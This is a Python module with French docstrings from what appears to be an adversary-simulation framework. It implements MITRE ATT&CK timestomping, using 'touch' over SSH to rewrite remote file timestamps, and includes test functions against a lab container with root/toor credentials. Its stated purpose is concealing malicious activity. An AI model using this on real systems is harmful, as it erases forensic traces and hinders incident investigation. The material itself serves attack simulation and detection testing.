#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri May 22 15:24:06 2026

@author: hounsousamuel
"""

import os
import sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

import time
import asyncio
from typing import Dict, Any, Optional, List
from datetime import datetime

from tactics.execution.command_execution import CommandExecution
from tactics.mittres import MITRE
from simulateur_utils.logger import get_logger

logger = get_logger()


class Timestomp(CommandExecution):
    """
    Modification des timestamps de fichiers (Timestomping).

    Technique MITRE ATT&CK: T1070.006 - Timestomp
    Permet de modifier les timestamps (modification, accès, création)
    d'un fichier pour dissimuler des activités malveillantes.
    """

    def __init__(
        self,
        name: str = "timestomp",
        timeout: int = 2,
        exec_timeout: int = 10,
        **kwargs
    ):
        """
        Initialise le Timestomp.

        Args:
            name (str): Nom de l'instance. Par défaut "timestomp".
            timeout (int): Timeout de connexion SSH en secondes.
            exec_timeout (int): Timeout d'exécution des commandes en secondes.
            **kwargs: Arguments supplémentaires transmis à CommandExecution.
        """
        super().__init__(name=name, timeout=timeout, exec_timeout=exec_timeout, **kwargs)
        self.timestomp_result: List[Dict[str, Any]] = []
    
    
    @staticmethod
    def get_timestamp_format(date: datetime = None) -> str:
        """
        Convertit une date en format YYYYMMDDHHMM.SS pour touch -t.
        
        Args:
            date: datetime object. Si None, utilise la date actuelle.
        
        Returns:
            str: Date formatée "YYYYMMDDHHMM.SS"
        """
        if date is None:
            date = datetime.now()
        
        return date.strftime("%Y%m%d%H%M.%S")
    
    async def _timestomp_async(
        self,
        ip: str,
        port: int,
        username: str,
        password: str,
        file_path: str,
        target_date: str,
        pkey=None
    ) -> Dict[str, Any]:
        """
        Implémentation interne du timestomp sur un fichier.

        Args:
            ip (str): IP de la cible.
            port (int): Port SSH.
            username (str): Nom d'utilisateur.
            password (str): Mot de passe.
            file_path (str): Chemin du fichier à modifier.
            target_date (str): Date cible au format "YYYYMMDDHHMM.SS".

        Returns:
            Dict[str, Any]: Résultat de l'opération.
        """
        self.log(f"Début Timestomp sur {file_path} -> {target_date}", log=True)
        
        cmd = f"touch -a -m -t {target_date} {file_path} 2>&1"

        exec_result = await self.exec_command_async(
            ip=ip,
            port=port,
            username=username,
            password=password,
            commands=[cmd],
            pkey=pkey
        )
        self.timestomp_result = exec_result
        return exec_result

    async def _timestomp_to_file_async(
        self,
        ip: str,
        port: int,
        username: str,
        password: str,
        source: str,
        target: str,
        pkey=None
    ) -> Dict[str, Any]:
        """
        Implémentation interne du timestomp par copie de timestamps.

        Args:
            ip (str): IP de la cible.
            port (int): Port SSH.
            username (str): Nom d'utilisateur.
            password (str): Mot de passe.
            source (str): Fichier source (timestamps à copier).
            target (str): Fichier cible (timestamps à modifier).

        Returns:
            Dict[str, Any]: Résultat de l'opération.
        """
        self.log(f"Début Timestomp : copie de {source} vers {target}", log=True)
        
        cmd = f"touch -a -m -r {source} {target} 2>&1"

        exec_result = await self.exec_command_async(
            ip=ip,
            port=port,
            username=username,
            password=password,
            commands=[cmd],
            pkey=pkey
        )
        self.timestomp_result = exec_result
        return exec_result

    async def timestomp_file(
        self,
        ip: str,
        port: int,
        username: str,
        password: str,
        file_path: str,
        target_date: str,
        total_timeout: Optional[float] = None,
        pkey=None
    ) -> Dict[str, Any]:
        """
        Modifie les timestamps d'un fichier avec une date cible.

        Args:
            ip (str): IP de la cible.
            port (int): Port SSH.
            username (str): Nom d'utilisateur.
            password (str): Mot de passe.
            file_path (str): Chemin du fichier à modifier.
            target_date (str): Date cible au format "YYYYMMDDHHMM.SS".
            total_timeout (Optional[float]): Timeout global.

        Returns:
            Dict[str, Any]: Résultat formaté.
        """
        self.start_time = time.time()

        if total_timeout:
            try:
                async with asyncio.timeout(total_timeout):
                    await self._timestomp_async(ip, port, username, password, file_path, target_date, pkey=pkey)
            except asyncio.TimeoutError:
                self.log(f"Timeout après {total_timeout}s", log=True)
        else:
            await self._timestomp_async(ip, port, username, password, file_path, target_date, pkey=pkey)

        self.end_time = time.time()
        self.log(f"Timestomp terminé sur {file_path}", log=True)

        return self.timestomp_get_result()

    async def timestomp_to_another_file(
        self,
        ip: str,
        port: int,
        username: str,
        password: str,
        source: str,
        target: str,
        total_timeout: Optional[float] = None,
        pkey=None
    ) -> Dict[str, Any]:
        """
        Copie les timestamps d'un fichier source vers un fichier cible.

        Args:
            ip (str): IP de la cible.
            port (int): Port SSH.
            username (str): Nom d'utilisateur.
            password (str): Mot de passe.
            source (str): Fichier source (timestamps à copier).
            target (str): Fichier cible (timestamps à modifier).
            total_timeout (Optional[float]): Timeout global.

        Returns:
            Dict[str, Any]: Résultat formaté.
        """
        self.start_time = time.time()

        if total_timeout:
            try:
                async with asyncio.timeout(total_timeout):
                    await self._timestomp_to_file_async(ip, port, username, password, source, target, pkey=pkey)
            except asyncio.TimeoutError:
                self.log(f"Timeout après {total_timeout}s", log=True)
        else:
            await self._timestomp_to_file_async(ip, port, username, password, source, target, pkey=pkey)

        self.end_time = time.time()
        self.log(f"Timestomp terminé : {source} -> {target}", log=True)

        return self.timestomp_get_result()

    def timestomp_file_sync(self, *args, **kwargs) -> Dict[str, Any]:
        """
        Version synchrone de timestomp_file.
        """
        return asyncio.run(self.timestomp_file(*args, **kwargs))

    def timestomp_to_another_file_sync(self, *args, **kwargs) -> Dict[str, Any]:
        """
        Version synchrone de timestomp_to_another_file.
        """
        return asyncio.run(self.timestomp_to_another_file(*args, **kwargs))

    def timestomp_get_result(self) -> Dict[str, Any]:
        """
        Génère le résultat formaté du timestomp.

        Returns:
            Dict[str, Any]: Résultat formaté.
        """
        self.save()

        mitres = [MITRE.get("Timestomp", {})]

        results = self.timestomp_result.get("results", {})

        return {
            'severity': 'LOW',
            'elapsed': self.end_time - self.start_time if self.end_time and self.start_time else 0,
            "mitres": mitres,
            'results': {
                "commands": results.get("commands", {}),
                "success_number": results.get("success_number", 0),
                "success_rate": results.get("success_rate", 0.0),
            },
        }


# =============================================================================
# Fonction de test
# =============================================================================

def test_timestomp(
    ip: str = "172.17.0.2",
    port: int = 22,
    username: str = "root",
    password: str = "toor",
    file_path: str = "/tmp/test.txt",
    target_date: str = Timestomp.get_timestamp_format(),
    total_timeout: float = 30.0,
    pkey=None,
    **kwargs,
):
    """
    Teste la classe Timestomp sur une cible.

    Args:
        ip (str): IP de la cible.
        port (int): Port SSH.
        username (str): Nom d'utilisateur.
        password (str): Mot de passe.
        file_path (str): Chemin du fichier à modifier.
        target_date (str): Date cible.
        total_timeout (float): Timeout total.
    """
    print(f"\n🕐 Test Timestomp sur {username}@{ip}:{port}")
    print("-" * 50)

    timestomp = Timestomp(timeout=5, exec_timeout=10)
    cmd_exec = CommandExecution()
    cmd_exec.exec_command_sync(
        ip=ip, port=port,
        username=username, password=password,
        pkey=pkey,
        commands=[f"touch {file_path}"],
    )

    result = timestomp.timestomp_file_sync(
        ip=ip,
        port=port,
        username=username,
        password=password,
        file_path=file_path,
        target_date=target_date,
        total_timeout=total_timeout,
        pkey=pkey
    )

    severity = result.get("severity", "UNKNOWN")
    elapsed = result.get("elapsed", 0)
    results = result.get("results", {})
    success_number = results.get("success_number", 0)
    success_rate = results.get("success_rate", 0)

    severity_icon = {"LOW": "🟢", "MEDIUM": "🟡", "HIGH": "🔴"}.get(severity, "⚪")

    print(f"\n{severity_icon} Sévérité : {severity}")
    print(f"⏱️  Temps : {elapsed:.2f}s")
    print(f"📊 Commandes exécutées : {success_number}")
    print(f"📈 Taux de succès : {success_rate:.2%}")

    return result


def test_timestomp_copy(
    ip: str = "172.17.0.2",
    port: int = 22,
    username: str = "root",
    password: str = "toor",
    source: str = "/etc/passwd",
    target: str = "/tmp/test_copy.txt",
    total_timeout: float = 30.0,
    **kwargs,
):
    """
    Teste la copie de timestamps.

    Args:
        ip (str): IP de la cible.
        port (int): Port SSH.
        username (str): Nom d'utilisateur.
        password (str): Mot de passe.
        source (str): Fichier source.
        target (str): Fichier cible.
        total_timeout (float): Timeout total.
    """
    print(f"\n🕐 Test Timestomp Copy sur {username}@{ip}:{port}")
    print("-" * 50)

    timestomp = Timestomp(timeout=5, exec_timeout=10)

    cmd_exec = CommandExecution()
    cmd_exec.exec_command_sync(
        ip=ip, port=port,
        username=username, password=password,
        commands=[f"touch {target}"]
    )

    result = timestomp.timestomp_to_another_file_sync(
        ip=ip,
        port=port,
        username=username,
        password=password,
        source=source,
        target=target,
        total_timeout=total_timeout
    )

    severity = result.get("severity", "UNKNOWN")
    elapsed = result.get("elapsed", 0)
    results = result.get("results", {})
    success_number = results.get("success_number", 0)
    success_rate = results.get("success_rate", 0)

    severity_icon = {"LOW": "🟢", "MEDIUM": "🟡", "HIGH": "🔴"}.get(severity, "⚪")

    print(f"\n{severity_icon} Sévérité : {severity}")
    print(f"⏱️  Temps : {elapsed:.2f}s")
    print(f"📊 Commandes exécutées : {success_number}")
    print(f"📈 Taux de succès : {success_rate:.2%}")

    return result

def test_get_timstamp():
    now = datetime.now()
    print(Timestomp.get_timestamp_format(now))
    # → 202405221430.22

    # Date spécifique
    old = datetime(2020, 1, 1, 0, 0, 0)
    print(Timestomp.get_timestamp_format(old))
    # → 202001010000.00

    # À partir d'un timestamp Unix
    timestamp = 1609459200  # 2021-01-01 00:00:00
    date = datetime.fromtimestamp(timestamp)
    print(Timestomp.get_timestamp_format(date))
    # → 202101010000.00

def full_test_timestomp(*args, **kwargs):
    test_timestomp(*args, **kwargs)
    test_timestomp_copy(*args, **kwargs)

if __name__ == "__main__":
    # test_timestomp()
    # test_timestomp_copy()
    test_get_timstamp()
    